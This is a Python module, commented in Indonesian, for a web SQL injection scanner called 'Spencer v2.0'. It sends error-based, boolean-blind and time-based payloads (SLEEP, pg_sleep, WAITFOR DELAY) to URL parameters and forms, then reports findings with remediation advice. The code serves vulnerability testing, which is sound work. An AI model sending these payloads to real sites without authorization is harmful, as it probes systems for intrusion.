"""
Spencer v2.0 — Advanced SQL Injection Scanner
Mendukung 3 teknik deteksi:
1. Error-based (dari v1.0) — analisis error message
2. Boolean-based Blind — bandingkan response TRUE vs FALSE
3. Time-based Blind — ukur delay response

Semua logika ditulis original. Non-destructive (tidak DROP/DELETE).
"""

import time
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from utils.crawler import HEADERS
from scanner.sqli import SQL_ERROR_PATTERNS  # Reuse pattern dari v1


# Boolean-based: pasangan payload TRUE dan FALSE
# Server harus respond dengan content yang berbeda jika rentan
BOOLEAN_PAIRS = [
    {"true": "1' AND '1'='1", "false": "1' AND '1'='2", "type": "String-based"},
    {"true": "1 AND 1=1", "false": "1 AND 1=2", "type": "Numeric-based"},
    {"true": "1' AND '1'='1' --", "false": "1' AND '1'='2' --", "type": "Comment-terminated"},
    {"true": "1) AND (1=1", "false": "1) AND (1=2", "type": "Parenthesis-based"},
]

# Time-based: payload yang memicu delay jika rentan
TIME_PAYLOADS = [
    # MySQL
    {"payload": "1' AND SLEEP(3)-- -", "delay": 3, "dbms": "MySQL"},
    {"payload": "1 AND SLEEP(3)", "delay": 3, "dbms": "MySQL"},
    # PostgreSQL
    {"payload": "1'; SELECT pg_sleep(3)-- -", "delay": 3, "dbms": "PostgreSQL"},
    # MSSQL
    {"payload": "1'; WAITFOR DELAY '0:0:3'-- -", "delay": 3, "dbms": "MSSQL"},
    # Generic with OR
    {"payload": "1' OR SLEEP(3)-- -", "delay": 3, "dbms": "MySQL (OR)"},
]


def scan_sqli_advanced(target_url: str, forms: list = None, param_links: list = None,
                       timeout: int = 15, enable_time_based: bool = True) -> dict:
    """
    Advanced SQLi scan dengan 3 teknik deteksi.
    
    Args:
        target_url: URL utama target
        forms: List form dari crawler (kalau None, scan URL params saja)
        param_links: List URL dengan params dari crawler
        timeout: HTTP timeout
        enable_time_based: Aktifkan time-based detection (lebih lambat)
    """
    findings = []
    passed = 0
    failed = 0
    tests_performed = {"error_based": 0, "boolean_based": 0, "time_based": 0}
    
    forms = forms or []
    param_links = param_links or []
    
    # Test URL parameters di target_url itu sendiri
    target_params = _get_url_params(target_url)
    if target_params:
        for param_name in target_params:
            result = _test_param_all_techniques(target_url, param_name, timeout, enable_time_based)
            tests_performed["error_based"] += result["tests"]["error"]
            tests_performed["boolean_based"] += result["tests"]["boolean"]
            tests_performed["time_based"] += result["tests"]["time"]
            
            if result["vulnerable"]:
                failed += 1
                findings.append({
                    "check": f"SQLi: URL param '{param_name}' [{result['technique']}]",
                    "status": "FAIL",
                    "severity": "CRITICAL",
                    "detail": f"SQL Injection terdeteksi ({result['technique']}). {result['detail']}",
                    "recommendation": "Gunakan parameterized queries/prepared statements. "
                                     "JANGAN concatenate user input ke SQL query."
                })
    
    # Test forms dari crawler
    for form in forms[:30]:  # Batasi maksimal 30 form untuk efisiensi
        result = _test_form_all_techniques(form, timeout, enable_time_based)
        tests_performed["error_based"] += result["tests"]["error"]
        tests_performed["boolean_based"] += result["tests"]["boolean"]
        tests_performed["time_based"] += result["tests"]["time"]
        
        if result["vulnerable"]:
            failed += 1
            findings.append({
                "check": f"SQLi: Form {form['method']} {_short(form['action'])} [{result['technique']}]",
                "status": "FAIL",
                "severity": "CRITICAL",
                "detail": f"SQL Injection terdeteksi ({result['technique']}). {result['detail']}",
                "recommendation": "Gunakan parameterized queries pada server-side. "
                                 "Validasi dan sanitasi input."
            })
    
    # Test param links dari crawler
    for link in param_links[:20]:
        for param_name in link["params"]:
            url_with_params = link["url"] + "?" + urlencode(link["params"])
            result = _test_param_all_techniques(url_with_params, param_name, timeout, enable_time_based)
            tests_performed["error_based"] += result["tests"]["error"]
            tests_performed["boolean_based"] += result["tests"]["boolean"]
            tests_performed["time_based"] += result["tests"]["time"]
            
            if result["vulnerable"]:
                failed += 1
                findings.append({
                    "check": f"SQLi: {_short(link['url'])} '{param_name}' [{result['technique']}]",
                    "status": "FAIL",
                    "severity": "CRITICAL",
                    "detail": f"SQL Injection ({result['technique']}). {result['detail']}",
                    "recommendation": "Gunakan parameterized queries."
                })
                break
    
    total_tests = sum(tests_performed.values())
    
    if failed == 0:
        passed = 1
        findings.append({
            "check": "Advanced SQL Injection Scan",
            "status": "PASS",
            "severity": "INFO",
            "detail": f"Tidak ditemukan SQLi ({total_tests} tests: "
                      f"{tests_performed['error_based']} error-based, "
                      f"{tests_performed['boolean_based']} boolean-based, "
                      f"{tests_performed['time_based']} time-based)",
            "recommendation": "-"
        })
    
    return {
        "target": target_url,
        "findings": findings,
        "tests_performed": tests_performed,
        "total_tests": total_tests,
        "forms_tested": len(forms),
        "param_links_tested": len(param_links),
        "passed": passed,
        "failed": failed,
        "total_checks": max(passed + failed, 1)
    }


def _test_param_all_techniques(url: str, param_name: str, timeout: int, time_based: bool) -> dict:
    """Test URL parameter dengan 3 teknik. Return temuan pertama."""
    tests = {"error": 0, "boolean": 0, "time": 0}
    
    # === TEKNIK 1: Error-based ===
    error_payloads = ["'", "\"", "' OR '1'='1", "1'"]
    for payload in error_payloads:
        tests["error"] += 1
        result_text = _send_param_request(url, param_name, payload, timeout)
        if result_text and _check_sql_error(result_text):
            return {
                "vulnerable": True,
                "technique": "Error-based",
                "detail": f"Server merespons dengan SQL error message saat payload '{payload}' dikirim",
                "tests": tests
            }
    
    # === TEKNIK 2: Boolean-based Blind ===
    # Dapatkan baseline response (request normal)
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    original_value = params.get(param_name, [""])[0]
    
    baseline_text = _send_param_request(url, param_name, original_value, timeout)
    if not baseline_text:
        return {"vulnerable": False, "tests": tests}
    
    baseline_len = len(baseline_text)
    
    for pair in BOOLEAN_PAIRS:
        tests["boolean"] += 1
        true_text = _send_param_request(url, param_name, original_value + pair["true"], timeout)
        false_text = _send_param_request(url, param_name, original_value + pair["false"], timeout)
        
        if not true_text or not false_text:
            continue
        
        # Boolean SQLi terdeteksi jika:
        # - TRUE response panjang mirip baseline
        # - FALSE response berbeda signifikan
        true_diff = abs(len(true_text) - baseline_len)
        false_diff = abs(len(false_text) - baseline_len)
        
        # Threshold: TRUE harus dekat dengan baseline (< 5% diff)
        # FALSE harus berbeda signifikan (> 10% diff) DAN beda dari TRUE
        if (true_diff < baseline_len * 0.05 and 
            false_diff > baseline_len * 0.1 and 
            abs(len(true_text) - len(false_text)) > baseline_len * 0.1):
            return {
                "vulnerable": True,
                "technique": "Boolean-based Blind",
                "detail": f"Response length berbeda antara TRUE ({len(true_text)} bytes) "
                         f"vs FALSE ({len(false_text)} bytes). Tipe: {pair['type']}",
                "tests": tests
            }
    
    # === TEKNIK 3: Time-based Blind (with verification) ===
    if time_based:
        # Baseline timing: 3 sample untuk variance check
        baseline_times = []
        for _ in range(3):
            start = time.time()
            _send_param_request(url, param_name, original_value, timeout)
            baseline_times.append(time.time() - start)
        baseline_avg = sum(baseline_times) / len(baseline_times)
        baseline_max = max(baseline_times)
        baseline_variance = max(baseline_times) - min(baseline_times)
        
        # Skip time-based jika baseline variance terlalu tinggi (network unstable)
        if baseline_variance > 2.0:
            return {"vulnerable": False, "tests": tests}
        
        for tp in TIME_PAYLOADS[:3]:
            tests["time"] += 1
            
            # STEP 1: Initial detection
            start = time.time()
            _send_param_request(url, param_name, original_value + tp["payload"], timeout)
            elapsed1 = time.time() - start
            
            # Suspicious jika delay >= 80% expected DAN > baseline + 2s
            if not (elapsed1 > tp["delay"] * 0.8 and elapsed1 > baseline_max + 2):
                continue
            
            # STEP 2: VERIFICATION dengan payload sleep berbeda (5 detik)
            verify_payload = tp["payload"].replace("SLEEP(3)", "SLEEP(5)").replace("pg_sleep(3)", "pg_sleep(5)").replace("0:0:3", "0:0:5")
            tests["time"] += 1
            start = time.time()
            _send_param_request(url, param_name, original_value + verify_payload, timeout + 5)
            elapsed2 = time.time() - start
            
            # Verification PASS jika delay SLEEP(5) ~ 5 detik (proporsional)
            if not (elapsed2 > 4 and elapsed2 > elapsed1 + 1):
                continue
            
            # STEP 3: Re-baseline untuk memastikan bukan koincidensi network
            start = time.time()
            _send_param_request(url, param_name, original_value, timeout)
            elapsed3 = time.time() - start
            
            # Re-baseline harus tetap cepat (< baseline_max + 1)
            if elapsed3 > baseline_max + 1:
                continue
            
            # SEMUA 3 verifikasi LOLOS → genuine time-based SQLi
            return {
                "vulnerable": True,
                "technique": "Time-based Blind (Verified)",
                "detail": f"Verified SQL injection. SLEEP(3)={elapsed1:.2f}s, "
                         f"SLEEP(5)={elapsed2:.2f}s, baseline={baseline_avg:.2f}s. "
                         f"DBMS: {tp['dbms']}",
                "tests": tests
            }
    
    return {"vulnerable": False, "tests": tests}


def _test_form_all_techniques(form: dict, timeout: int, time_based: bool) -> dict:
    """Test form dengan 3 teknik."""
    tests = {"error": 0, "boolean": 0, "time": 0}
    
    # === Error-based ===
    error_payloads = ["'", "\"", "' OR '1'='1"]
    for payload in error_payloads:
        tests["error"] += 1
        result_text = _send_form_request(form, payload, timeout)
        if result_text and _check_sql_error(result_text):
            return {
                "vulnerable": True,
                "technique": "Error-based",
                "detail": f"SQL error message terdeteksi dengan payload '{payload}'",
                "tests": tests
            }
    
    # === Boolean-based ===
    baseline_text = _send_form_request(form, "test123", timeout)
    if baseline_text:
        baseline_len = len(baseline_text)
        for pair in BOOLEAN_PAIRS[:2]:  # Batasi 2 pair per form
            tests["boolean"] += 1
            true_text = _send_form_request(form, pair["true"], timeout)
            false_text = _send_form_request(form, pair["false"], timeout)
            
            if not true_text or not false_text:
                continue
            
            true_diff = abs(len(true_text) - baseline_len)
            false_diff = abs(len(false_text) - baseline_len)
            
            if (true_diff < baseline_len * 0.05 and 
                false_diff > baseline_len * 0.1 and 
                abs(len(true_text) - len(false_text)) > baseline_len * 0.1):
                return {
                    "vulnerable": True,
                    "technique": "Boolean-based Blind",
                    "detail": f"Response length berbeda: TRUE={len(true_text)} vs FALSE={len(false_text)}",
                    "tests": tests
                }
    
    # === Time-based untuk form (with verification) ===
    if time_based:
        # Baseline timing untuk form
        baseline_times = []
        for _ in range(3):
            start = time.time()
            _send_form_request(form, "baselinetest123", timeout)
            baseline_times.append(time.time() - start)
        baseline_max = max(baseline_times)
        baseline_avg = sum(baseline_times) / len(baseline_times)
        baseline_variance = max(baseline_times) - min(baseline_times)
        
        # Skip jika network terlalu unstable
        if baseline_variance > 2.0:
            return {"vulnerable": False, "tests": tests}
        
        for tp in TIME_PAYLOADS[:2]:
            tests["time"] += 1
            
            # STEP 1: Initial detection dengan SLEEP(3)
            start = time.time()
            _send_form_request(form, tp["payload"], timeout)
            elapsed1 = time.time() - start
            
            if not (elapsed1 > tp["delay"] * 0.8 and elapsed1 > baseline_max + 2):
                continue
            
            # STEP 2: Verification dengan SLEEP(5)
            verify_payload = tp["payload"].replace("SLEEP(3)", "SLEEP(5)").replace("pg_sleep(3)", "pg_sleep(5)").replace("0:0:3", "0:0:5")
            tests["time"] += 1
            start = time.time()
            _send_form_request(form, verify_payload, timeout + 5)
            elapsed2 = time.time() - start
            
            if not (elapsed2 > 4 and elapsed2 > elapsed1 + 1):
                continue
            
            # STEP 3: Re-baseline check
            start = time.time()
            _send_form_request(form, "baselinetest456", timeout)
            elapsed3 = time.time() - start
            
            if elapsed3 > baseline_max + 1:
                continue
            
            return {
                "vulnerable": True,
                "technique": "Time-based Blind (Verified)",
                "detail": f"Verified injection. SLEEP(3)={elapsed1:.2f}s, "
                         f"SLEEP(5)={elapsed2:.2f}s, baseline={baseline_avg:.2f}s. "
                         f"DBMS: {tp['dbms']}",
                "tests": tests
            }
    
    return {"vulnerable": False, "tests": tests}


def _send_param_request(url: str, param_name: str, payload: str, timeout: int) -> str:
    """Send GET request dengan payload di parameter tertentu."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param_name] = [payload]
    flat = {k: v[0] for k, v in params.items()}
    new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                          parsed.params, urlencode(flat), parsed.fragment))
    try:
        resp = requests.get(new_url, timeout=timeout, headers=HEADERS, allow_redirects=True)
        return resp.text
    except Exception:
        return None


def _send_form_request(form: dict, payload: str, timeout: int) -> str:
    """Send form submission dengan payload."""
    data = {}
    for inp in form["inputs"]:
        if inp["type"] in ("text", "search", "email", "tel", "url", "number", "password", ""):
            data[inp["name"]] = payload
        elif inp["type"] == "hidden":
            data[inp["name"]] = inp["value"]
        else:
            data[inp["name"]] = inp.get("value", "test")
    
    try:
        if form["method"] == "POST":
            resp = requests.post(form["action"], data=data, timeout=timeout,
                                headers=HEADERS, allow_redirects=True)
        else:
            resp = requests.get(form["action"], params=data, timeout=timeout,
                               headers=HEADERS, allow_redirects=True)
        return resp.text
    except Exception:
        return None


def _check_sql_error(text: str) -> bool:
    """Cek SQL error patterns."""
    lower = text.lower()
    return any(p in lower for p in SQL_ERROR_PATTERNS)


def _get_url_params(url: str) -> dict:
    parsed = urlparse(url)
    if parsed.query:
        params = parse_qs(parsed.query, keep_blank_values=True)
        return {k: v[0] if v else "" for k, v in params.items()}
    return {}


def _short(url: str, max_len: int = 30) -> str:
    path = urlparse(url).path
    return ("..." + path[-(max_len-3):]) if len(path) > max_len else path
